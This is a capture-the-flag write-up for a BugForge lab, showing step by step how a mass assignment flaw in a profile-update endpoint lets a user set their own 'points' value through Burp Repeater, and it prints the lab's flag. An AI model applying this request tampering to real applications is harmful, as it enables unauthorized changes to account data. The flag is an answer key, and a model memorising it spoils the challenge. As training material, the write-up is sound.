# Cafe Club - cafeclub-007 - Time to update your profile. 

---

## 1. Open the Lab

Open the provided BugForge lab and register or log in to the application.

Navigate to the **Profile** page.

---

## 2. Update the Profile Normally

Change one of the profile fields and submit the form.

The browser sends a request similar to:

```http
PUT /api/profile HTTP/2
Host: lab-1790267467023-qrybfw.labs-app.bugforge.io
Authorization: Bearer <JWT>
Content-Type: application/json
```

The normal request body contains:

```json
{
  "full_name": "Test",
  "email": "test@mail.com",
  "address": "qwertyuiop,lkjhgfdsa,zxcvbnm",
  "phone": "1234567890"
}
```

The server responds:

```json
{
  "message": "Profile updated successfully"
}
```

---

## 3. Inspect the User Data

The browser's Local Storage contained:

```json
{
  "id": 5,
  "username": "Test",
  "email": "test@mail.com",
  "full_name": "test",
  "address": "qwertyuiop,lkjhgfdsa,zxcvbnm",
  "phone": "1234567890",
  "points": 0,
  "role": "user"
}
```

The important fields are:

```text
points: 0
role: user
```

These fields aren't part of the normal profile-update form.

This suggests that the backend may be accepting additional JSON properties.

---

## 4. Capture the Request in Burp Suite

Open **Burp Suite → Proxy → HTTP history**.

Find:

```http
PUT /api/profile
```

Right-click the request and select:

```text
Send to Repeater
```

---

## 5. Test for Mass Assignment

In Burp Repeater, add the `points` property to the JSON body.

Use:

```json
{
  "full_name": "test",
  "email": "test@mail.com",
  "address": "qwertyuiop,lkjhgfdsa,zxcvbnm",
  "phone": "1234567890",
  "points": 999999
}
```

Send the request.

---

## 6. Observe the Response

The server responds:

```json
{
  "message": "Profile updated successfully bug{68Xu7BkbnQXAJ1FuBIn9DQkTTNs3blHZ}"
}
```

The challenge flag is therefore:

```text
bug{68Xu7BkbnQXAJ1FuBIn9DQkTTNs3blHZ}
```

---

## 7. Vulnerability Explanation

The application suffers from **Mass Assignment**.

The profile endpoint accepts user-controlled JSON properties without properly restricting which fields can be modified.

The legitimate profile fields were:

```text
full_name
email
address
phone
```

However, the backend also accepted:

```text
points
```

A field such as `points` should normally be controlled exclusively by server-side application logic.

By adding:

```json
"points": 999999
```

to the request, the server processed the unauthorized property.

---

## Attack Flow

```text
Open Profile
     ↓
Update profile
     ↓
Capture PUT /api/profile
     ↓
Inspect JSON parameters
     ↓
Add unauthorized "points" field
     ↓
Set points = 999999
     ↓
Send request
     ↓
Server accepts the field
     ↓
Flag returned
```